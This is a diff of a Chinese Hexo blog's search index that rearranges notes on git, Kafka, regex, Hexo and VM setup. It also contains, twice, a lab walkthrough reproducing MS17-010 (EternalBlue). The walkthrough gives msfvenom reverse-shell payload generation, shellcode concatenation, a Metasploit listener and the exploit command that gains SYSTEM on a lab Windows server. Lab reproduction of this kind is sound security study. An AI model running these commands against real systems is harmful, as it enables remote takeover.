+<h4 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h4>
+<p>将本地的分支版本上传到远程并合并</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h4>
+<p>从远程仓库下载最新的commit，并且同时保留本地分支head和远程分支remotes，需要另外使用<code>git merge</code>合并分支</p>
+<h4 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h4>
+<p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
+<h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
+<p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
+<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/image-20210708151055459.png" alt="image-20210708151055459"></p>
+<p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
+<h4 id="版本回退"><a class="header-anchor" href="#版本回退"></a>版本回退</h4>
+<p>首先<code>git log</code>查看历史提交的版本信息</p>
+<p>得到各个commit的id，即其哈希值</p>
+<p>使用<code>git reset --hard &lt;commitId&gt;</code>切换到各个版本提交时的状态（清空暂存区）</p>
+<p>但实际上回退之前的版本还是存在的，使用<code>git reflog</code>可以查看历史版本记录，找到已提交过的任何一个版本的commitId，通过commitId仍可以切回最新的未回退的版本。</p>
+<h3 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h3>
+<h4 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch                  #列出已有分支</span><br><span class="line">git branch &lt;branchname&gt;     #创建新分支</span><br><span class="line">git checkout &lt;branchname&gt;   #切换到分支</span><br><span class="line">git branch -d &lt;branchname&gt;  #删除分支</span><br></pre></td></tr></table></figure>
+<p>在一个分支进行文件修改、新建、删除等操作在commit后不会影响其他分支。</p>
+<h4 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge &lt;branchname&gt;    #把 &lt;branchname&gt; 分支合并到当前分支</span><br></pre></td></tr></table></figure>
+<p>在将<code>branch2</code>合并到<code>branch1</code>的过程中，branch2中新建文件、删除原有文件、修改原有文件等操作将同步到branch1，当两个分支都做出修改时，可能会出现代码冲突，这时候需要我们手动修改解决冲突后再次提交才能合并成功。</p>
+<h2 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h2>
+<ol>
+<li>
+<p>新建GitHub仓库，第一次push时验证账号密码失败</p>
+<p>一开始提示输入GitHub的用户名口令，正确输入后还是验证失败。这时候会出现新的登录窗口，提示通过OpenSSH登录到GitHub，这时候，输入GitHub用户名和access token（settings-developer settings-Personal access tokens）即可登录成功</p>
+</li>
+<li>
+<p>配置免密登录</p>
+<p><a href="https://www.cnblogs.com/qishuaiRisen/p/16650513.html">https://www.cnblogs.com/qishuaiRisen/p/16650513.html</a></p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>环境配置</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>环境配置</tag>
-        <tag>hexo</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
-<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
-<p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
-<p>关闭靶机防火墙</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
-<p>在window server 2012中启动Guest账号</p>
-<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
-<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
-<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
-<p>下载到kali后后使用NASM工具对asm代码编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
-<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
-<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
-<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
-<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
-<p>保存退出，然后运行该脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
-<p>运行成功，此时返回msf命令行</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
-<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
+    <title>kafka</title>
+    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
+    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
+<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
+<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
+<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/image-20210714161917846.png" alt="image-20210714161917846"></p>
+<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
+<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
+<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
+<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
+<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
+<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
+        <tag>kafka</tag>
+        <tag>消息队列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在Markdown中使用emoji表情</title>
+    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
+    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
+<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
+<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
+<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
+<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
+<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked -S</span><br></pre></td></tr></table></figure>
+<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-it -S</span><br></pre></td></tr></table></figure>
+<p>完成之后安装所需的插件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i markdown-it-emoji -S</span><br></pre></td></tr></table></figure>
+<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true # 在 markdown 文本中支持 html tag 标签</span><br><span class="line">    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;</span><br><span class="line">    breaks: true # 用 &lt;br&gt; 开始新的一行</span><br><span class="line">    linkify: true # 自动将 可能是链接的内容转换成链接</span><br><span class="line">    typographer: true # 印刷标识转换</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-emoji # emoji表情插件</span><br><span class="line">    - markdown-it-abbr # 可选</span><br><span class="line">    - markdown-it-footnote # 可选</span><br><span class="line">    - markdown-it-ins # 可选，</span><br><span class="line">    - markdown-it-sub # 可选，下标，如H2O</span><br><span class="line">    - markdown-it-sup # 可选，上标，如2^10</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;&#39;</span><br><span class="line">    permalink: false,</span><br><span class="line">    permalinkClass: &#39;header-anchor&#39;</span><br><span class="line">    permalinkSymbol: &#39;&#39;</span><br><span class="line">    case: 0</span><br><span class="line">    separator: &#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>然后保存退出，再重新加载一下hexo即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Markdown</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式学习笔记（留坑待填）</title>
+    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
+<blockquote>
+<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
+</blockquote>
+<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>
+<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
+<p><strong>学习时用到的工具</strong>：</p>
+<p><a href="https://regex101.com/">Regexpal网站</a>：可以在线测试正则表达式</p>
+<p>…</p>
+<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
+<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
+<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
+<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
+<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
+<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
+<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
+<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0-9][0-9][0-9]</span><br></pre></td></tr></table></figure>
+<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
+<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
+<p>空白字符：</p>
+<p><code>\f</code>：换页符</p>
+<p><code>\n</code>：换行符</p>
+<p><code>\r</code>：回车符</p>
+<p><code>\t</code>：制表符（Tab的缩进）</p>
+<p><code>\v</code>：垂直制表符</p>
+<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
+<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
+<p>数字元字符：</p>
+<p><code>\d</code>：匹配任意阿拉伯数字</p>
+<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
+<p>字母数字元字符：</p>
+<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
+<p><code>\W</code>：对<code>\w</code>取非</p>
+<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
+<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
+<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
+<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
+<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
+<p><code>\1</code>后向引用被捕获的字符。</p>
+<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
+<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
+<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
+<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
+<p>同理，其他常用的量词还有</p>
+<p><code>+</code>：表示1个或者多个</p>
+<p><code>*</code>：表示0个或者多个</p>
+<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
+<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
+<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
+<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
+<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
+<p><code>$</code>匹配行的结束标志</p>
+<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
+<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
+<p>留坑待填</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>正则表达式</category>
+      </categories>
+      <tags>
+        <tag>正则表达式</tag>
       </tags>
   </entry>
   <entry>
@@ -949,6 +823,97 @@
       <categories>
         <category>渗透</category>
       </categories>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu (20.04)虚拟机安装配置</title>
+    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞/Java反序列化漏洞</title>
+    <url>/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="序列化和反序列化操作"><a class="header-anchor" href="#序列化和反序列化操作"></a>序列化和反序列化操作</h2>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p>
+<p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>hexo博客搭建</title>
+    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
+<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
+<p><strong>npm to cnpm</strong></p>
+<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
+<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
+<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
+<p>安装完成即可，没有必要配置ssh</p>
+<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
+<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>hexo</tag>
+      </tags>
   </entry>
   <entry>
     <title>Linux系统加固</title>
@@ -1186,6 +1151,88 @@
       </tags>
   </entry>
   <entry>
+    <title>kali(Debian)虚拟机的网络配置</title>
+    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
+<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
+<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
+<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
+<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
+<p>然后配置网卡eth0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
+<p>若要设置IP为静态的，则插入以下几行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
